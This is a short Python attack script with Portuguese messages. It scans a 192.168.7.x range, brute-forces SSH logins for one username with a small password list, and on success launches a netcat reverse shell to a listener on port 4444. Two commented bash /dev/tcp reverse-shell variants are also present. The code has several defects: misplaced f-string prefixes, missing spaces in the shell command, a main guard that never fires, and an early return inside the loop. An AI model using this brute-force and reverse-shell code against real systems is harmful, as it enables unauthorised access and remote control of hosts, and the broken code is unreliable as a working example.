import paramiko
import socket
import threading

def ssh_brute_force(ip,username,password_list):
 for password in password_list:
  try:
   client=paramiko.SSHClient()
   client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
   client.connect(ip,username=username,password=password,timeout=5)
   print("f[+]Acesso bem-sucedido em {ip}com a senha:{password}")

  # Disparar reverse shell
  #comando_reverse ="bash -i >& /dev/tcp/192.168.7.13/4444 0>&1"
  #comando_reverse = "bash -c 'bash -i>& /dev/tcp/192.168.7.13/4444 0>&1'"

   comando_reverse="mkfifo/tmp/f;cat/tmp/f |zsh -i 2>&1 |nc 192.168.7.5 4444>/tmp/f"
   stdin,stdout,stderr=client.exec_command(comando_reverse)
   return ip,password
  except(paramiko.ssh_exception.AuthenticationException,socket.error):
   continue
  return None,None

def scan_network():
 faixa_ips=["192.168.7."+str(i)for i in range(5,130)] #IPs de 192.168.1.10 até 192.168.1.130
 username="cristle"
 wordlist=["admin","1234","password","root123","123456"]

 for ip in faixa_ips:
  ip_vulneravel,senha=ssh_brute_force(ip,username,wordlist)
  if ip_vulneravel:
     print("f[+]Máquina vulneravel encontrada:{ip_vulneravel}")

if __name__ == "__name__":
  scan_network()
